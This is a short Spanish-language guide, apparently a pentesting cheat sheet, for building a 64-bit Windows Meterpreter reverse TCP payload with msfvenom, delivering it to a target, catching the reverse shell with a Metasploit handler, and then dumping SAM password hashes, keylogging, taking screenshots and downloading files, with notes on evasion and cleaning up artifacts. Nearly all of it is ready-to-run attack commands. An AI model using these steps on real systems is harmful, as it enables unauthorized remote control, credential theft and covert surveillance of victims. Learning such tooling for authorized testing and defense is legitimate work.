**Generación y uso de Meterpreter 64-bit Windows shell con msfvenom**

---

### 1. Generar payload con msfvenom

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Atacker-IP> LPORT=<PORT> -f exe -o shell.exe
```

* `-p windows/x64/meterpreter/reverse_tcp`: payload Meterpreter 64-bit reverse TCP.
* `LHOST`: IP del atacante (listener).
* `LPORT`: puerto escucha.
* `-f exe`: formato ejecutable Windows.
* `-o shell.exe`: archivo generado.

---

### 2. Subir `shell.exe` a Windows Target

* Usar métodos: SMB, FTP, RDP, webshell, PowerShell `Invoke-WebRequest`, etc.

---

### 3. Configurar listener en Metasploit

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <Atacker-IP>
set LPORT <PORT>
run
```

* Espera conexión entrante del payload.

---

### 4. Ejecutar `shell.exe` en Windows Target

* Desde CMD, PowerShell o interfaz remota:

```cmd
.\shell.exe
```

---

### 5. Control y experimentación con Meterpreter

* Al conectarse, consola Meterpreter disponible.
* Comandos útiles:

| Comando              | Descripción                            |
| -------------------- | -------------------------------------- |
| `sysinfo`            | Información del sistema víctima        |
| `getuid`             | Usuario con que corre la sesión        |
| `shell`              | Abrir shell CMD interactivo            |
| `ps`                 | Listar procesos                        |
| `migrate <PID>`      | Migrar Meterpreter a otro proceso      |
| `hashdump`           | Volcar hashes SAM (si permisos altos)  |
| `upload <src> <dst>` | Subir archivos a víctima               |
| `download <file>`    | Descargar archivos desde víctima       |
| `keyscan_start`      | Iniciar registro de teclas (keylogger) |
| `keyscan_dump`       | Mostrar teclas capturadas              |
| `screenshot`         | Tomar screenshot del escritorio        |
| `portfwd`            | Redirigir puertos                      |

---

### 6. Consideraciones

* Ejecutar `shell.exe` con privilegios adecuados para maximizar capacidades.
* Meterpreter puede usar técnicas de evasión y encubrimiento.
* Limpiar artefactos y sesiones tras prueba.

---